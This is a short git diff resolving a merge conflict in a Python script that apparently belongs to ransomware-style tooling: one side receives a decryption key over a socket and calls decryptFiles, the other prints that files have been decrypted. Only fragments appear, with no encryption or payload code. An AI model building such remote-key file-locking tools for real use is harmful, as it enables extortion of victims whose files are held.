@@ -136,12 +136,6 @@ if __name__ == "__main__":
                 if not data:
                     sys.exit()
                 
-<<<<<<< HEAD
-                # recv waits for new input of key to decrypt
-                key = s.recv(4096).decode("Utf-8")
-                print(key)
-                decryptFiles(key)
-=======
                 else:
                     
                     ''' 
@@ -164,4 +158,3 @@ if __name__ == "__main__":
 
                     print("Files have been decrypted.")
                     sys.exit()
->>>>>>> d492bebec27ccc85069eae2a93c5ee5f513bff4d
